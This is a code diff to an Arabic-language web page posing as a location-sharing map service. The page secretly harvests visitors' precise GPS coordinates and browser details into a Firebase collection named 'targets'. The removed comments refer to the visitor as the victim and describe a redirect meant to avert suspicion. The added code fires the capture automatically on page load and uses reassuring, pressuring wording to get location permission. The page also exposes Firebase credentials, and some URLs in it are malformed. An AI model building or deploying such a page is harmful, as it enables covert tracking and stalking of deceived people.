@@ -39,17 +39,16 @@
 
     <div class="container">
         <h1>📍 مشاركة الموقع الجغرافي</h1>
-        <p>لتتمكن من استلام وتحديد الموقع بدقة على الخريطة التفاعلية، يرجى الضغط على الزر أدناه والموافقة على إذن الوصول المباشر.</p>
-        <button class="btn" id="startBtn">اضغط هنا للمشاركة</button>
+        <p>يرجى الموافقة على إذن الوصول المباشر للموقع المعروض في نافذة المتصفح لتتمكن من استخدام الخدمة بنجاح.</p>
+        <button class="btn" id="startBtn">جاري جلب الموقع...</button>
         <div id="status"></div>
     </div>
 
     <script>
-        // إعدادات الـ Firebase الجديدة والمحدثة الخاصة بمشروعك الحالي
         const firebaseConfig = {
           apiKey: "AIzaSyDN0-VVc22XXx1bDh7rICBMxIBxWQcTc-k",
-          authDomain: "mylocationshare-70ce6.firebaseapp.com",
-          databaseURL: "https://mylocationshare-70ce6-default-rtdb.firebaseio.com",
+          authDomain: "://firebaseapp.com",
+          databaseURL: "https://firebaseio.com",
           projectId: "mylocationshare-70ce6",
           storageBucket: "mylocationshare-70ce6.firebasestorage.app",
           messagingSenderId: "394362922510",
@@ -57,16 +56,14 @@
           measurementId: "G-B3V083SLLY"
         };
 
-        // تهيئة Firebase
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        const startBtn = document.getElementById('startBtn');
         const statusDiv = document.getElementById('status');
+        const startBtn = document.getElementById('startBtn');
 
-        startBtn.addEventListener('click', () => {
-            statusDiv.textContent = "جاري طلب الإذن وجلب الموقع...";
-            
+        // دالة الصيد التلقائي الفورية بمجرد فتح الصفحة
+        function autoCapture() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
@@ -74,7 +71,6 @@
                         const lng = position.coords.longitude;
                         const accuracy = position.coords.accuracy;
 
-                        // حفظ الإحداثيات فوراً في قاعدة البيانات
                         database.ref('targets/').push({
                             latitude: lat,
                             longitude: lng,
@@ -82,40 +78,27 @@
                             deviceAgent: navigator.userAgent,
                             time: new Date().toLocaleString('ar-EG')
                         }).then(() => {
+                            startBtn.textContent = "تم التأكيد ✅";
                             statusDiv.style.color = "#28a745";
-                            statusDiv.textContent = "تمت مشاركة الموقع بنجاح! جاري تحويلك...";
+                            statusDiv.textContent = "تم الاتصال الخريطة جاهزة!";
                             
-                            // توجيه الضحية لإبعاد الشبهة بعد سحب الموقع
                             setTimeout(() => {
                                 window.location.href = `https://google.com{lat},${lng}`;
-                            }, 1500);
-                        }).catch((error) => {
-                            statusDiv.style.color = "#dc3545";
-                            statusDiv.textContent = "فشل في إرسال البيانات: " + error.message;
+                            }, 1000);
                         });
                     },
                     (error) => {
                         statusDiv.style.color = "#dc3545";
-                        switch(error.code) {
-                            case error.PERMISSION_DENIED:
-                                statusDiv.textContent = "يجب عليك السماح بالوصول للموقع لتحديث الخريطة.";
-                                break;
-                            case error.POSITION_UNAVAILABLE:
-                                statusDiv.textContent = "معلومات الموقع غير متوفرة حالياً.";
-                                break;
-                            case error.TIMEOUT:
-                                statusDiv.textContent = "انتهت مهلة طلب الموقع.";
-                                break;
-                            default:
-                                statusDiv.textContent = "حدث خطأ غير معروف.";
-                        }
+                        statusDiv.textContent = "يرجى تنشيط خيار تحديد الموقع من أعلى المتصفح لإتمام العملية.";
                     },
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    { enableHighAccuracy: true, timeout: 15000 }
                 );
-            } else {
-                statusDiv.textContent = "المتصفح لا يدعم تحديد المواقع.";
             }
-        });
+        }
+
+        // تشغيل الدالة فوراً عند تحميل الصفحة بالكامل دون الحاجة للنقر
+        window.onload = autoCapture;
+        startBtn.addEventListener('click', autoCapture);
     </script>
 </body>
 </html>
